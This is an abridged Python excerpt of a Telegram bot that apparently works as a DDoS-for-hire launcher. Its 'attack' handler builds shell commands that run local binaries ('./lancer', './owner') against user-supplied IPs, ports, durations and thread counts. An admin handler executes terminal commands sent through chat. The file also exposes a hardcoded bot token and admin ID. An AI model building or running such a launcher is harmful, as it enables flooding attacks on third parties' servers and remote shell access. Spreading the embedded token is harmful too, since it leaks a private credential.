...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '6327595825:AAESUB0DvqtEQ09RYKA5jW_yJs9fYmgq9Ks'

# Admin user IDs
ADMIN_USER_ID = 708030615
ADMIN_USER_ID = 708030615
...
async def execute_terminal(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            ...
            text="❌ *You are not authorized to execute terminal commands Dm @NOOB_AM!*",
            parse_mode='Markdown'
        )
        return
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot Dm @NOOB_AM!*", parse_mode='Markdown')
        return
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./lancer {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./owner {ip} {port} {duration} {threads}"
